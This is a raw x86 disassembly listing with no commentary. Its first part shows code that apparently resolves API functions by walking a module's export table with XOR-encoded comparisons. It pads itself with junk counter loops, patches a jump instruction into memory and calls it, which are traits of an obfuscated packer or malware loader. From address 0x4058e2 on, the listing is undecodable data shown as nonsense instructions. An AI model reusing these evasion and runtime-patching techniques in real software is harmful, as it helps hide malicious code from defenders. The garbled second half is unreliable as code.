  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [edx+0x19],ecx
  4058f0:	mov    ah,0x85
  4058f2:	xor    al,0x5f
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	or     BYTE PTR [esi+0x52f87951],bh
  405900:	or     BYTE PTR [edi],al
  405902:	fiadd  WORD PTR [ecx-0xb]
  405905:	lahf   
  405906:	mov    eax,ds:0x25ed57cf
  40590b:	fisub  DWORD PTR [eax-0x56]
  40590e:	sub    dh,BYTE PTR [ebp+0x49bcb5a5]
  405914:	and    al,0x3d
  405916:	fidiv  WORD PTR [ebx+0x73]
  405919:	mov    dh,0x35
  40591b:	dec    edi
  40591c:	jbe    0x40592e
  40591e:	pop    esi
  40591f:	jmp    0x31780027
  405924:	in     al,dx
  405925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405926:	call   DWORD PTR [ecx+edi*8+0x1f590d4e]
  40592d:	fidivr WORD PTR [ebx]
  40592f:	xchg   edx,eax
  405930:	iret   
  405931:	imul   edx,DWORD PTR [ecx],0xc1558161
  405937:	sub    BYTE PTR [edi-0x47a1377b],0x96
  40593e:	(bad)  
  405940:	imul   ebp,DWORD PTR [eax],0xffffffa7
  405943:	mov    dh,0x4f
  405945:	inc    ebx
  405946:	icebp  
  405947:	ret    
  405948:	mov    edx,0xa0988114
  40594d:	icebp  
  40594e:	pop    esp
  40594f:	jg     0x40597f
  405951:	jecxz  0x4058d3
  405953:	imul   eax,DWORD PTR [ebx+0x6b],0xca11dd02
  40595a:	xchg   esp,eax
  40595b:	mov    al,0x47
  40595d:	jl     0x4059de
  40595f:	cmp    BYTE PTR [edx-0x389db058],dl
  405965:	jb     0x405920
  405967:	jp     0x405911
  405969:	sub    cl,BYTE PTR [edx]
  40596b:	out    dx,eax
  40596c:	add    DWORD PTR [edx+ecx*2-0x45048dce],ebx
  405973:	das    
  405974:	sub    esp,edi
  405976:	inc    esi
  405977:	and    al,0x51
  405979:	push   ebp
  40597a:	bound  ebx,QWORD PTR [edi-0x4]
  40597d:	cmp    BYTE PTR [eax+0x4b2cc554],cl
  405983:	xor    edx,ecx
  405985:	fist   DWORD PTR [edx]
  405987:	aaa    
  405988:	jb     0x40598d
  40598a:	pop    ecx
  40598b:	mov    edi,0x1375f0e
  405990:	mov    ?,WORD PTR [ebp+0x6fe407ca]
  405996:	in     eax,0x49
  405998:	jbe    0x40593d
  40599a:	ins    DWORD PTR es:[edi],dx
  40599b:	cmp    eax,DWORD PTR [edi-0x31]
  40599e:	fst    DWORD PTR [edx]
  4059a0:	mov    ds,WORD PTR [ebx-0x121eb94b]
  4059a6:	mov    esi,0xdff57e94
  4059ab:	jecxz  0x4059e2
  4059ad:	data16 cmp BYTE PTR [ebx+0x3f],al
  4059b1:	push   esi
  4059b2:	mov    al,ds:0x9be28fba
  4059b7:	add    ebp,esp
  4059b9:	outs   dx,BYTE PTR ds:[esi]
  4059ba:	xchg   edx,eax
  4059bb:	push   0x5b
  4059bd:	cs int 0x85
  4059c0:	push   es
  4059c1:	mov    al,BYTE PTR [ecx+0x64]
  4059c4:	or     BYTE PTR [ebx-0x8],al
  4059c7:	shr    DWORD PTR [ecx],0x8d
  4059ca:	imul   ecx,DWORD PTR [eax+0xc],0xffffffa2
  4059ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cf:	daa    
  4059d0:	mov    ebx,0x392aecc9
  4059d5:	(bad)  
  4059d6:	push   0x69
  4059d8:	or     eax,0xe3ba1e5c
  4059dd:	xchg   DWORD PTR [ebp-0x5a],esp
  4059e0:	aaa    
  4059e1:	or     dl,al
  4059e3:	sbb    DWORD PTR [ecx+0x2],0x9e57aa4a
  4059ea:	mov    BYTE PTR [ebx-0x53],dl
  4059ed:	pusha  
  4059ee:	scas   al,BYTE PTR es:[edi]
  4059ef:	mov    bl,0x73
  4059f1:	mov    ecx,?
  4059f3:	xor    DWORD PTR [edi-0x26],esi
  4059f6:	inc    ecx
  4059f7:	adc    ebp,DWORD PTR [ebx-0x157881e8]
  4059fd:	fsub   DWORD PTR [ebp-0x9]
  405a00:	enter  0xa148,0x3e
  405a04:	mov    eax,ds:0x8abf83f4
  405a09:	je     0x405a0a
  405a0b:	xor    esp,edx
  405a0d:	pop    ds
  405a0e:	fidiv  WORD PTR [edx-0x5395279]
  405a14:	add    BYTE PTR [eax],al
  405a16:	push   ebp
  405a17:	sahf   
  405a18:	sub    ecx,edi
  405a1a:	and    edi,esi
  405a1c:	add    al,0x8f
  405a1e:	sbb    edi,0x1092f33d
  405a24:	in     eax,0xb0
  405a26:	aaa    
  405a27:	add    BYTE PTR es:[ebx-0x77],cl
  405a2b:	dec    eax
  405a2c:	ins    BYTE PTR es:[edi],dx
  405a2d:	jmp    0xcc63:0xc5bfd742
  405a34:	jne    0x4059ec
  405a36:	inc    ebx
  405a37:	lds    edx,FWORD PTR [esi]
  405a39:	pusha  
  405a3a:	xchg   ebx,eax
  405a3b:	or     eax,0xa1913154
  405a40:	inc    edx
  405a41:	cli    
  405a42:	push   0xffffffab
  405a44:	repz or BYTE PTR [edx],ah
  405a47:	jae    0x405a4f
  405a49:	xchg   cl,bh
  405a4b:	pop    esp
  405a4c:	mov    esp,ebp
  405a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a4f:	mov    ebp,esp
  405a51:	jecxz  0x405aa5
  405a53:	fs test al,0xa8
  405a56:	mov    eax,DWORD PTR [eax+0x6d]
  405a59:	shl    DWORD PTR ds:0x6460b14,cl
  405a5f:	dec    esi
  405a60:	addr16 iret 
  405a62:	xchg   esp,eax
  405a63:	mov    edi,fs
  405a65:	mov    eax,0xd42b02fb
  405a6a:	lods   al,BYTE PTR ds:[esi]
  405a6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a6c:	xor    edx,ebp
  405a6e:	in     al,dx
  405a6f:	das    
  405a70:	(bad)  
  405a71:	jecxz  0x405adb
  405a73:	(bad)  
  405a74:	das    
  405a75:	out    dx,eax
  405a76:	(bad)  
  405a78:	lds    ebx,FWORD PTR es:[edi]
  405a7b:	ja     0x405ac7
  405a7d:	push   ss
  405a7e:	shl    cl,cl
  405a80:	mov    ch,0xcf
  405a82:	(bad)  
  405a83:	in     eax,0xba
  405a85:	dec    ecx
  405a86:	mov    edi,0x63220959
  405a8b:	jp     0x405a7d
  405a8d:	xor    DWORD PTR [edx+0x11020b1b],esi
  405a93:	mov    edx,0xba9aca7f
  405a98:	scas   eax,DWORD PTR es:[edi]
  405a99:	inc    ebp
  405a9a:	mov    ah,0x4d
  405a9c:	push   ebp
  405a9d:	in     al,dx
  405a9e:	das    
  405a9f:	pop    eax
  405aa0:	inc    ecx
  405aa1:	stos   DWORD PTR es:[edi],eax
  405aa2:	jb     0x405ab4
  405aa4:	mov    eax,cs:0x9b29c7de
  405aaa:	cli    
  405aab:	daa    
  405aac:	jo     0x405adf
  405aae:	adc    edi,esi
  405ab0:	xchg   esp,eax
  405ab1:	retf   
  405ab2:	(bad)  [edi-0x49]
  405ab5:	jg     0x405b17
  405ab7:	inc    ecx
  405ab8:	push   ss
  405ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aba:	mov    BYTE PTR [ebx],bl
  405abc:	mov    BYTE PTR [edx-0x443b187f],bl
  405ac2:	or     al,0x5f
  405ac4:	loopne 0x405b35
  405ac6:	sar    BYTE PTR [edx+ecx*4],cl
  405ac9:	cmp    BYTE PTR [edi+ebx*4],ah
  405acc:	jnp    0x405b08
  405ace:	aas    
  405acf:	cmp    DWORD PTR [eax-0x6],edi
  405ad2:	sub    al,0x3c
  405ad4:	mov    ah,0xee
  405ad6:	jo     0x405abe
  405ad8:	lods   al,BYTE PTR ds:[esi]
  405ad9:	pushf  
  405ada:	cdq    
  405adb:	jg     0x405a6d
  405add:	int3   
  405ade:	push   eax
  405adf:	call   0x4355955c
  405ae4:	fbstp  TBYTE PTR [eax-0x2f6e71be]
  405aea:	andps  xmm5,XMMWORD PTR [ecx-0x11]
  405aee:	or     eax,ebp
  405af0:	test   al,0x21
  405af2:	dec    edi
  405af3:	enter  0xe76d,0x5c
  405af7:	add    DWORD PTR [ecx+ecx*2+0x7e],eax
  405afb:	sar    cl,0xe9
  405afe:	gs (bad) 
  405b00:	and    BYTE PTR [ebx+0x277f9eb9],al
  405b06:	dec    esp
  405b07:	jnp    0x405b1d
  405b09:	int    0x78
  405b0b:	es dec eax
  405b0d:	jo     0x405af7
  405b0f:	mov    esi,fs
  405b11:	retf   0x7a5d
  405b14:	xor    ch,dh
  405b16:	pop    edx
  405b17:	fadd   QWORD PTR [ebx+0x386181f]
  405b1d:	or     eax,0x27173aed
  405b22:	cmp    bl,dl
  405b24:	add    ch,BYTE PTR [ecx+0x17ade9bc]
  405b2a:	ret    
  405b2b:	mov    ch,0xc1
  405b2d:	dec    ecx
